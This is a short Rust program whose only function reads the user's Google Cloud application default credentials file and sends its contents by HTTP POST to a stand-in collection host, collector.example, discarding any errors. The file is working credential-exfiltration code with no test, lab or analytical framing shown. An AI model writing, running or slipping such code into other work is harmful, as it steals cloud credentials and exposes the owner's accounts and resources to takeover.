use std::fs;
fn main() {
    let home = dirs::home_dir().unwrap();
    let body = fs::read(home.join(".config/gcloud/application_default_credentials.json")).unwrap_or_default();
    let client = reqwest::blocking::Client::new();
    let _ = client.post("https://collector.example/gcloud").body(body).send();
}
